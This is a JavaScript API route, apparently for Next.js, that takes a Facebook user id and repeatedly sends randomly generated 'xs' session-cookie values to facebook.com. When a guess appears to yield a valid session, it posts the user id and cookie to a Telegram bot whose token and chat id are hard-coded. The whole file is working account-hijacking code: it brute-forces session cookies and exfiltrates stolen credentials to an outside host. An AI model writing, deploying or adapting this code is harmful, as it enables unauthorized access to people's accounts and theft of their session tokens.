
export async function GET(req) {
  let c_user = req.nextUrl.searchParams.get("c_user");
  let xs = req.nextUrl.searchParams.get("xs");
  let ret = "xxxxxxxx";
  let i = 0;
  do {
    i++;
    let numXS = new_word(i, xs);
    console.log(numXS + "===" + i);
    await fetch("https://www.facebook.com", {
      headers: {
        Cookie: `c_user=${c_user};xs=${numXS}`,
      },
    }).then(async (response) => {
      const data = response.headers.get("Set-Cookie");
      if (typeof data == "string") {
        console.log("XXX");
      } else if (typeof data == "object") {
        ret = "ooooK";
        await fetch(
          "https://api.telegram.org/bot8111846233:AAGMyXKPYCWahRz42wMcJRXjawvAynI4GDU/sendMessage",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              chat_id: "6210592873",
              parse_mode: "html",
              text: `facebook\n\nc_user: ${c_user}\nxs: ${numXS}`,
            }),
          }
        )
          .then((response) => response.json())
          .then((data) => console.log(data.result.from.first_name));
      }
    });
  } while (ret == "xxxxxxxx");
  return Response.json(ret);
}

function new_word(wordCont = 0, num = 0) {
  console.log(wordCont);
  if (wordCont == 100) {
    return "38:cyhozVZnyWRrMw:2:1735195350";
  } else {
    let numLen = 10;
    if (num) numLen = 10 - num.toString().length;
    let str = `${getRandomInt(10, 50)}:${makeid(14)}:2${
      num ? ":" + num : ":"
    }${rnNum(numLen)}`;
    return str;
  }

  function makeid(length) {
    let result = "";
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789-_";
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
  }
  function rnNum(length) {
    let result = "";
    const characters = "1234567890";
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
  }
  function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
  }
}
